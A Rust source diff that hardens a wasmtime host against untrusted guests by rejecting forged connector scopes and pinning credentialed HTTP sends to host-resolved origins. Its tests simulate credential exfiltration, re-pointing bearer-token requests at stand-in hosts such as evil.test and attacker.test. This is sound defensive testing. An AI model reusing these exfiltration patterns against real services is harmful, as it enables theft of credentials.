@@ -1,7 +1,7 @@
 use std::collections::{BTreeMap, BTreeSet};
 use std::fs;
 use std::path::Path;
-use std::sync::Arc;
+use std::sync::{Arc, Mutex, MutexGuard};
 use std::time::Duration;
 
 use anyhow::{Context, Result, anyhow};
@@ -156,6 +156,39 @@ struct HostState {
     /// invoking a halt-capable node. The guest reads it via
     /// `OP_DURABILITY_GET_CHECKPOINT_HANDLE`.
     checkpoint_handle: Option<CheckpointHandle>,
+    /// Host-side connector auth gate for the current invocation (packet H2b,
+    /// spec §7 truth table). Tracks what the *host* connector runtime granted
+    /// this node so credentialed sends can be origin-pinned without trusting
+    /// guest-supplied payloads.
+    connector_auth: Mutex<ConnectorAuthGate>,
+}
+
+/// Per-invocation record of host-granted connector facts (packet H2b).
+///
+/// The wasmtime guest is untrusted: every payload crossing the cap-call
+/// boundary is attacker-controlled in the threat model. This gate is
+/// populated exclusively from values the HOST computed — the resolved
+/// endpoint profile returned by `resources.connector_runtime()` and the fact
+/// that a credential was attached — never from guest-asserted data. It backs
+/// two enforcement points:
+///
+/// 1. `handle_connector_apply_outbound_auth` refuses to attach a credential
+///    to a request whose URL origin is not one of the endpoint-profile
+///    origins the host resolved for this node (fail closed when none were
+///    resolved).
+/// 2. `handle_http_send` refuses ANY send to an origin outside the granted
+///    set once a credential has been issued to guest memory during this
+///    invocation — so even a guest that extracts the secret from the
+///    credentialed bytes cannot re-point it at another host through this
+///    boundary.
+#[derive(Debug, Default)]
+struct ConnectorAuthGate {
+    /// Origins (scheme://authority, lowercased) of endpoint profiles the
+    /// host connector runtime resolved during this invocation.
+    granted_origins: BTreeSet<String>,
+    /// True once the host has returned credentialed request bytes to the
+    /// guest during this invocation.
+    credential_issued: bool,
 }
 
 pub struct WasmRuntime {
@@ -216,6 +249,7 @@ impl WasmRuntime {
         let state = HostState {
             resources,
             checkpoint_handle: None,
+            connector_auth: Mutex::new(ConnectorAuthGate::default()),
         };
         let mut store = Store::new(&self.engine, state);
         let mut linker = Linker::new(&self.engine);
@@ -247,26 +281,19 @@ impl WasmRuntime {
                     OP_BLOB_GET => handle_blob_get(caller.data().resources.as_ref(), req),
                     OP_BLOB_PUT => handle_blob_put(caller.data().resources.as_ref(), req),
                     OP_BLOB_DELETE => handle_blob_delete(caller.data().resources.as_ref(), req),
-                    OP_HTTP_READ_SEND => {
-                        handle_http_send(caller.data().resources.as_ref(), req, true)
-                    }
-                    OP_HTTP_WRITE_SEND => {
-                        handle_http_send(caller.data().resources.as_ref(), req, false)
-                    }
+                    OP_HTTP_READ_SEND => handle_http_send(caller.data(), req, true),
+                    OP_HTTP_WRITE_SEND => handle_http_send(caller.data(), req, false),
                     OP_CONNECTOR_GET_SCOPE => {
                         handle_connector_get_scope(caller.data().resources.as_ref())
                     }
                     OP_CONNECTOR_APPLY_OUTBOUND_AUTH => {
-                        handle_connector_apply_outbound_auth(caller.data().resources.as_ref(), req)
+                        handle_connector_apply_outbound_auth(caller.data(), req)
                     }
                     OP_CONNECTOR_RESOLVE_ENDPOINT_PROFILE => {
-                        handle_connector_resolve_endpoint_profile(
-                            caller.data().resources.as_ref(),
-                            req,
-                        )
+                        handle_connector_resolve_endpoint_profile(caller.data(), req)
                     }
                     OP_CONNECTOR_RESOLVE_CONNECTION => {
-                        handle_connector_resolve_connection(caller.data().resources.as_ref(), req)
+                        handle_connector_resolve_connection(caller.data(), req)
                     }
                     OP_KV_GET => handle_kv_get(caller.data().resources.as_ref(), req),
                     OP_KV_PUT => handle_kv_put(caller.data().resources.as_ref(), req),
@@ -700,11 +727,99 @@ fn handle_blob_delete(resources: &dyn ResourceAccess, req: &[u8]) -> Vec<u8> {
     }
 }
 
-fn handle_http_send(resources: &dyn ResourceAccess, req: &[u8], read_only: bool) -> Vec<u8> {
+/// Derive the trusted connector scope for a guest cap-call (packet H2b).
+///
+/// The guest payload carries a `ConnectorBindingScope`, but the guest is
+/// untrusted on this host: honoring it would let a compromised guest borrow
+/// another node's connection or credentials. The host's
+/// `resources.connector_scope()` (built host-side by kernel-exec per node) is
+/// the only source of truth; the guest-supplied scope is accepted only when
+/// it matches exactly, and the HOST copy is what gets passed to the connector
+/// runtime.
+fn require_trusted_scope(
+    resources: &dyn ResourceAccess,
+    guest_scope: &ConnectorBindingScope,
+    op_label: &str,
+) -> Result<ConnectorBindingScope> {
+    let trusted = resources.connector_scope().ok_or_else(|| {
+        anyhow!("{op_label}: no connector scope is granted to this node host-side")
+    })?;
+    if *guest_scope != trusted {
+        return Err(anyhow!(
+            "{op_label}: guest-supplied connector scope (flow `{}`, node `{}`, connector `{}`) \
+             does not match the host-granted scope (flow `{}`, node `{}`, connector `{}`)",
+            guest_scope.flow_id,
+            guest_scope.node_alias,
+            guest_scope.connector_id,
+            trusted.flow_id,
+            trusted.node_alias,
+            trusted.connector_id,
+        ));
+    }
+    Ok(trusted)
+}
+
+/// Extract the lowercased `scheme://authority` origin of a URL. Mirrors the
+/// `origin_of` comparison used by the connector.http transport (HTTP105) so
+/// host-side pinning and guest-side assertion agree on origin identity.
+fn url_origin(url: &str) -> Option<String> {
+    let (scheme, rest) = url.split_once("://")?;
+    let authority = rest.split(['/', '?', '#']).next()?;
+    if scheme.is_empty() || authority.is_empty() {
+        return None;
+    }
+    Some(format!(
+        "{}://{}",
+        scheme.to_ascii_lowercase(),
+        authority.to_ascii_lowercase()
+    ))
+}
+
+fn lock_auth_gate(state: &HostState) -> Result<MutexGuard<'_, ConnectorAuthGate>> {
+    state
+        .connector_auth
+        .lock()
+        .map_err(|_| anyhow!("connector auth gate poisoned"))
+}
+
+fn handle_http_send(state: &HostState, req: &[u8], read_only: bool) -> Vec<u8> {
+    let resources = state.resources.as_ref();
     let request: HttpRequest = match decode_json_request(req, "http") {
         Ok(request) => request,
         Err(err) => return encode_http_err(HttpError::InvalidResponse(err.to_string())),
     };
+
+    // Origin pin (packet H2b, spec §7): once credentialed request bytes have
+    // been issued to guest memory in this invocation, every send through this
+    // boundary must target an endpoint-profile origin the HOST resolved for
+    // this node. A guest that re-points a credentialed request (or copies the
+    // secret into a fresh request) at another host is rejected here,
+    // independent of anything the guest asserts.
+    {
+        let gate = match lock_auth_gate(state) {
+            Ok(gate) => gate,
+            Err(err) => return encode_http_err(HttpError::Transport(err)),
+        };
+        if gate.credential_issued {
+            let origin = url_origin(&request.url);
+            let permitted = origin
+                .as_deref()
+                .is_some_and(|origin| gate.granted_origins.contains(origin));
+            if !permitted {
+                return encode_http_err(HttpError::Transport(anyhow!(
+                    "host origin pin rejected send: URL origin `{}` is not an endpoint-profile \
+                     origin granted to this node (a credential was issued during this invocation; \
+                     granted origins: [{}])",
+                    origin.as_deref().unwrap_or("<unparseable>"),
+                    gate.granted_origins
+                        .iter()
+                        .map(String::as_str)
+                        .collect::<Vec<_>>()
+                        .join(", "),
+                )));
+            }
+        }
+    }
 
     let result = if read_only {
         let client = match resources.http_read() {
@@ -741,9 +856,16 @@ fn handle_connector_get_scope(resources: &dyn ResourceAccess) -> Vec<u8> {
     }
 }
 
-fn handle_connector_apply_outbound_auth(resources: &dyn ResourceAccess, req: &[u8]) -> Vec<u8> {
+fn handle_connector_apply_outbound_auth(state: &HostState, req: &[u8]) -> Vec<u8> {
+    let resources = state.resources.as_ref();
     let request: ApplyOutboundAuthRequest = match decode_json_request(req, "connector auth") {
         Ok(request) => request,
+        Err(err) => return encode_err(err),
+    };
+
+    // H2b fix (a): never trust the guest-asserted scope — derive it host-side.
+    let scope = match require_trusted_scope(resources, &request.scope, "connector auth") {
+        Ok(scope) => scope,
         Err(err) => return encode_err(err),
     };
 
@@ -752,25 +874,67 @@ fn handle_connector_apply_outbound_auth(resources: &dyn ResourceAccess, req: &[u
         None => return encode_err("missing connector runtime"),
     };
 
+    // H2b fix (b), issuance side: a credential may only be attached to a
+    // request whose URL origin the host itself resolved (via
+    // `resolve_endpoint_profile`) for this node during this invocation. Fail
+    // closed when no endpoint profile was resolved host-side.
     let mut http_request = request.request;
+    let request_origin = match url_origin(&http_request.url) {
+        Some(origin) => origin,
+        None => {
+            return encode_err(format!(
+                "connector auth: request URL `{}` has no parseable origin; refusing to attach a \
+                 credential",
+                http_request.url
+            ));
+        }
+    };
+    {
+        let gate = match lock_auth_gate(state) {
+            Ok(gate) => gate,
+            Err(err) => return encode_err(err),
+        };
+        if !gate.granted_origins.contains(&request_origin) {
+            return encode_err(format!(
+                "connector auth: request URL origin `{request_origin}` is not an \
+                 endpoint-profile origin resolved host-side for this node; refusing to attach a \
+                 credential (granted origins: [{}])",
+                gate.granted_origins
+                    .iter()
+                    .map(String::as_str)
+                    .collect::<Vec<_>>()
+                    .join(", "),
+            ));
+        }
+    }
+
     let profile = transport_auth_profile_to_descriptor(request.profile);
-    let result =
-        host_block_on(runtime.apply_outbound_auth(&request.scope, &profile, &mut http_request));
+    let result = host_block_on(runtime.apply_outbound_auth(&scope, &profile, &mut http_request));
     match result {
-        Ok(()) => encode_json_ok(&http_request),
+        Ok(()) => {
+            match lock_auth_gate(state) {
+                Ok(mut gate) => gate.credential_issued = true,
+                Err(err) => return encode_err(err),
+            }
+            encode_json_ok(&http_request)
+        }
         Err(err) => encode_err(err),
     }
 }
 
-fn handle_connector_resolve_endpoint_profile(
-    resources: &dyn ResourceAccess,
-    req: &[u8],
-) -> Vec<u8> {
+fn handle_connector_resolve_endpoint_profile(state: &HostState, req: &[u8]) -> Vec<u8> {
+    let resources = state.resources.as_ref();
     let request: ResolveEndpointProfileRequest =
         match decode_json_request(req, "connector endpoint") {
             Ok(request) => request,
             Err(err) => return encode_err(err),
         };
+
+    // H2b fix (a): derive the scope host-side instead of trusting the guest.
+    let scope = match require_trusted_scope(resources, &request.scope, "connector endpoint") {
+        Ok(scope) => scope,
+        Err(err) => return encode_err(err),
+    };
 
     let runtime = match resources.connector_runtime() {
         Some(runtime) => runtime,
@@ -778,16 +942,36 @@ fn handle_connector_resolve_endpoint_profile(
     };
 
     let profile = transport_endpoint_profile_to_descriptor(request.profile);
-    let result = host_block_on(runtime.resolve_endpoint_profile(&request.scope, &profile));
+    let result = host_block_on(runtime.resolve_endpoint_profile(&scope, &profile));
     match result {
-        Ok(profile) => encode_json_ok(&profile),
+        Ok(profile) => {
+            // Record the HOST-resolved origin as granted for this invocation;
+            // it is the pin credentialed sends are checked against (H2b).
+            if let Some(origin) = url_origin(&profile.base_url) {
+                match lock_auth_gate(state) {
+                    Ok(mut gate) => {
+                        gate.granted_origins.insert(origin);
+                    }
+                    Err(err) => return encode_err(err),
+                }
+            }
+            encode_json_ok(&profile)
+        }
         Err(err) => encode_err(err),
     }
 }
 
-fn handle_connector_resolve_connection(resources: &dyn ResourceAccess, req: &[u8]) -> Vec<u8> {
+fn handle_connector_resolve_connection(state: &HostState, req: &[u8]) -> Vec<u8> {
+    let resources = state.resources.as_ref();
     let request: ResolveConnectionRequest = match decode_json_request(req, "connector connection") {
         Ok(request) => request,
+        Err(err) => return encode_err(err),
+    };
+
+    // H2b fix (a): a forged scope must not let the guest borrow another
+    // node's connection.
+    let scope = match require_trusted_scope(resources, &request.scope, "connector connection") {
+        Ok(scope) => scope,
         Err(err) => return encode_err(err),
     };
 
@@ -796,7 +980,7 @@ fn handle_connector_resolve_connection(resources: &dyn ResourceAccess, req: &[u8
         None => return encode_err("missing connector runtime"),
     };
 
-    let result = host_block_on(runtime.resolve_connection(&request.scope));
+    let result = host_block_on(runtime.resolve_connection(&scope));
     match result {
         Ok(Some(connection)) => encode_json_ok(&connection),
         Ok(None) => encode_not_found(),
@@ -1164,4 +1348,342 @@ fn write_response(
         return ERRNO_EFAULT;
     }
     response.len() as i32
+}
+
+/// Packet H2b tests: the host-wasmtime connector auth boundary must not trust
+/// guest-supplied payloads. These drive the cap-call handlers exactly as the
+/// guest-side `RemoteConnectorRuntime` / `RemoteHttp*` transports do (same
+/// transport structs, same status-byte protocol), with a hostile guest
+/// simulated by forged payloads.
+#[cfg(test)]
+mod connector_auth_boundary_tests {
+    use super::*;
+    use capabilities::ResourceBag;
+    use capabilities::connector::{
+        ConnectorRuntime, ConnectorRuntimeError, EndpointProfileDescriptor,
+        OutboundAuthProfileDescriptor, ResolvedEndpointProfile,
+    };
+    use capabilities::http::{HttpMethod, HttpResponse, HttpResult};
+    use serde_json::json;
+
+    const SECRET: &str = "Bearer test-secret-token";
+
+    struct StaticBearerRuntime {
+        base_url: String,
+    }
+
+    #[async_trait]
+    impl ConnectorRuntime for StaticBearerRuntime {
+        async fn apply_outbound_auth(
+            &self,
+            _scope: &ConnectorBindingScope,
+            _profile: &OutboundAuthProfileDescriptor,
+            request: &mut HttpRequest,
+        ) -> Result<(), ConnectorRuntimeError> {
+            request.headers.insert("authorization", SECRET);
+            Ok(())
+        }
+
+        async fn resolve_endpoint_profile(
+            &self,
+            _scope: &ConnectorBindingScope,
+            _profile: &EndpointProfileDescriptor,
+        ) -> Result<ResolvedEndpointProfile, ConnectorRuntimeError> {
+            Ok(ResolvedEndpointProfile {
+                base_url: self.base_url.clone(),
+                default_headers: Vec::new(),
+            })
+        }
+    }
+
+    #[derive(Default)]
+    struct CaptureHttp {
+        sent: Mutex<Vec<HttpRequest>>,
+    }
+
+    #[async_trait]
+    impl capabilities::http::HttpRead for CaptureHttp {
+        async fn send(&self, request: HttpRequest) -> HttpResult<HttpResponse> {
+            self.sent.lock().expect("capture lock").push(request);
+            Ok(HttpResponse {
+                status: 200,
+                headers: Default::default(),
+                body: b"{}".to_vec(),
+            })
+        }
+    }
+
+    #[async_trait]
+    impl capabilities::http::HttpWrite for CaptureHttp {
+        async fn send(&self, request: HttpRequest) -> HttpResult<HttpResponse> {
+            self.sent.lock().expect("capture lock").push(request);
+            Ok(HttpResponse {
+                status: 200,
+                headers: Default::default(),
+                body: b"{}".to_vec(),
+            })
+        }
+    }
+
+    fn true_scope() -> ConnectorBindingScope {
+        ConnectorBindingScope::new("flow-a", "node-a", "tests::node_a", "connector.test")
+    }
+
+    fn forged_scope() -> ConnectorBindingScope {
+        ConnectorBindingScope::new(
+            "flow-a",
+            "node-victim",
+            "tests::node_victim",
+            "connector.test",
+        )
+    }
+
+    fn host_state(resources: ResourceBag) -> HostState {
+        HostState {
+            resources: Arc::new(resources),
+            checkpoint_handle: None,
+            connector_auth: Mutex::new(ConnectorAuthGate::default()),
+        }
+    }
+
+    fn connector_state(base_url: &str) -> (HostState, Arc<CaptureHttp>) {
+        let http = Arc::new(CaptureHttp::default());
+        let resources = ResourceBag::new()
+            .with_http_read(Arc::clone(&http))
+            .with_http_write(Arc::clone(&http))
+            .with_connector_runtime(Arc::new(StaticBearerRuntime {
+                base_url: base_url.to_string(),
+            }))
+            .with_connector_scope(true_scope());
+        (host_state(resources), http)
+    }
+
+    fn apply_payload(scope: &ConnectorBindingScope, url: &str) -> Vec<u8> {
+        serde_json::to_vec(&json!({
+            "scope": scope,
+            "profile": {
+                "connector_id": "connector.test",
+                "name": "test_auth",
+                "kind": { "kind": "bearer", "handle_kind": "http.bearer" }
+            },
+            "request": serde_json::to_value(HttpRequest::new(HttpMethod::Get, url)).unwrap(),
+        }))
+        .expect("encode apply payload")
+    }
+
+    fn endpoint_payload(scope: &ConnectorBindingScope) -> Vec<u8> {
+        serde_json::to_vec(&json!({
+            "scope": scope,
+            "profile": {
+                "connector_id": "connector.test",
+                "name": "default",
+                "base_url": "https://guest-asserted.test",
+                "default_headers": []
+            }
+        }))
+        .expect("encode endpoint payload")
+    }
+
+    fn connection_payload(scope: &ConnectorBindingScope) -> Vec<u8> {
+        serde_json::to_vec(&json!({ "scope": scope })).expect("encode connection payload")
+    }
+
+    fn send_payload(request: &HttpRequest) -> Vec<u8> {
+        serde_json::to_vec(request).expect("encode http request")
+    }
+
+    fn expect_err(response: Vec<u8>) -> String {
+        assert_eq!(response[0], RESP_ERR, "expected RESP_ERR response");
+        String::from_utf8(response[1..].to_vec()).expect("utf8 error message")
+    }
+
+    fn expect_ok_json(response: Vec<u8>) -> JsonValue {
+        assert_eq!(response[0], RESP_OK, "expected RESP_OK response");
+        serde_json::from_slice(&response[1..]).expect("json payload")
+    }
+
+    /// Resolve the endpoint profile through the host handler (recording the
+    /// host-granted origin), exactly as an honest guest transport does first.
+    fn resolve_endpoint(state: &HostState) -> JsonValue {
+        expect_ok_json(handle_connector_resolve_endpoint_profile(
+            state,
+            &endpoint_payload(&true_scope()),
+        ))
+    }
+
+    // ── Fix (a): guest-forged scopes are rejected host-side ────────────────
+
+    #[test]
+    fn forged_scope_is_rejected_on_every_scope_bearing_op() {
+        let (state, _http) = connector_state("https://api.good.test/v1");
+
+        let err = expect_err(handle_connector_apply_outbound_auth(
+            &state,
+            &apply_payload(&forged_scope(), "https://api.good.test/v1/items"),
+        ));
+        assert!(
+            err.contains("does not match the host-granted scope"),
+            "unexpected apply error: {err}"
+        );
+
+        let err = expect_err(handle_connector_resolve_endpoint_profile(
+            &state,
+            &endpoint_payload(&forged_scope()),
+        ));
+        assert!(
+            err.contains("does not match the host-granted scope"),
+            "unexpected endpoint error: {err}"
+        );
+
+        let err = expect_err(handle_connector_resolve_connection(
+            &state,
+            &connection_payload(&forged_scope()),
+        ));
+        assert!(
+            err.contains("does not match the host-granted scope"),
+            "unexpected connection error: {err}"
+        );
+    }
+
+    #[test]
+    fn scope_bearing_ops_fail_closed_when_host_grants_no_scope() {
+        let http = Arc::new(CaptureHttp::default());
+        let resources = ResourceBag::new()
+            .with_http_write(Arc::clone(&http))
+            .with_connector_runtime(Arc::new(StaticBearerRuntime {
+                base_url: "https://api.good.test".to_string(),
+            }));
+        let state = host_state(resources);
+
+        let err = expect_err(handle_connector_apply_outbound_auth(
+            &state,
+            &apply_payload(&true_scope(), "https://api.good.test/items"),
+        ));
+        assert!(
+            err.contains("no connector scope is granted"),
+            "unexpected error: {err}"
+        );
+    }
+
+    // ── Fix (b): credential issuance and sends are origin-pinned ───────────
+
+    #[test]
+    fn credential_issuance_is_pinned_to_host_resolved_origins() {
+        let (state, _http) = connector_state("https://api.good.test/v1");
+
+        // Fail closed: no endpoint profile resolved host-side yet.
+        let err = expect_err(handle_connector_apply_outbound_auth(
+            &state,
+            &apply_payload(&true_scope(), "https://api.good.test/v1/items"),
+        ));
+        assert!(
+            err.contains("refusing to attach a credential"),
+            "unexpected error: {err}"
+        );
+
+        let resolved = resolve_endpoint(&state);
+        assert_eq!(resolved["base_url"], json!("https://api.good.test/v1"));
+
+        // Guest composes a credentialed request for a foreign origin: rejected.
+        let err = expect_err(handle_connector_apply_outbound_auth(
+            &state,
+            &apply_payload(&true_scope(), "https://evil.test/exfiltrate"),
+        ));
+        assert!(
+            err.contains("is not an endpoint-profile origin"),
+            "unexpected error: {err}"
+        );
+
+        // Granted origin: credential attaches.
+        let credentialed = expect_ok_json(handle_connector_apply_outbound_auth(
+            &state,
+            &apply_payload(&true_scope(), "https://api.good.test/v1/items"),
+        ));
+        assert_eq!(credentialed["headers"]["authorization"], json!(SECRET));
+    }
+
+    #[test]
+    fn repointed_credentialed_send_is_rejected_host_side() {
+        let (state, http) = connector_state("https://api.good.test/v1");
+        resolve_endpoint(&state);
+        let credentialed: HttpRequest =
+            serde_json::from_value(expect_ok_json(handle_connector_apply_outbound_auth(
+                &state,
+                &apply_payload(&true_scope(), "https://api.good.test/v1/items"),
+            )))
+            .expect("credentialed request");
+
+        // Guest re-points the credentialed request at another host.
+        let mut repointed = credentialed.clone();
+        repointed.url = "https://evil.test/steal".to_string();
+        let response = handle_http_send(&state, &send_payload(&repointed), false);
+        let err = expect_err(response);
+        assert!(
+            err.contains("host origin pin rejected send"),
+            "unexpected error: {err}"
+        );
+
+        // Guest copies the secret into a fresh request: also rejected.
+        let mut fresh = HttpRequest::new(HttpMethod::Get, "https://attacker.test/collect");
+        fresh.headers.insert("authorization", SECRET);
+        let err = expect_err(handle_http_send(&state, &send_payload(&fresh), true));
+        assert!(
+            err.contains("host origin pin rejected send"),
+            "unexpected error: {err}"
+        );
+
+        assert!(
+            http.sent.lock().expect("capture lock").is_empty(),
+            "no re-pointed request may reach the HTTP provider"
+        );
+    }
+
+    // ── Regression: the existing connector happy path is unchanged ─────────
+
+    #[test]
+    fn connector_happy_path_still_flows_through_hardened_boundary() {
+        let (state, http) = connector_state("https://api.good.test/v1");
+
+        // Exact guest transport sequence (connectors-std / connector.http):
+        // get_scope → resolve_endpoint_profile → apply_outbound_auth → send.
+        let scope: ConnectorBindingScope = serde_json::from_value(expect_ok_json(
+            handle_connector_get_scope(state.resources.as_ref()),
+        ))
+        .expect("scope");
+        assert_eq!(scope, true_scope());
+
+        resolve_endpoint(&state);
+        let credentialed: HttpRequest =
+            serde_json::from_value(expect_ok_json(handle_connector_apply_outbound_auth(
+                &state,
+                &apply_payload(&scope, "https://api.good.test/v1/items"),
+            )))
+            .expect("credentialed request");
+
+        let response = expect_ok_json(handle_http_send(&state, &send_payload(&credentialed), true));
+        assert_eq!(response["status"], json!(200));
+
+        let sent = http.sent.lock().expect("capture lock");
+        assert_eq!(sent.len(), 1);
+        assert_eq!(sent[0].url, "https://api.good.test/v1/items");
+        assert_eq!(
+            sent[0].headers.get("authorization"),
+            Some(&SECRET.to_string())
+        );
+    }
+
+    #[test]
+    fn plain_http_send_without_connector_credential_is_unpinned() {
+        // Non-connector nodes (and Tier-2 any-origin ops, which never call
+        // apply_outbound_auth) keep sending to arbitrary origins, gated only
+        // by the CAP110 read/write accessors as before.
+        let http = Arc::new(CaptureHttp::default());
+        let resources = ResourceBag::new().with_http_read(Arc::clone(&http));
+        let state = host_state(resources);
+
+        let request = HttpRequest::new(HttpMethod::Get, "https://anywhere.test/data");
+        let response = expect_ok_json(handle_http_send(&state, &send_payload(&request), true));
+        assert_eq!(response["status"], json!(200));
+        assert_eq!(http.sent.lock().expect("capture lock").len(), 1);
+    }
 }
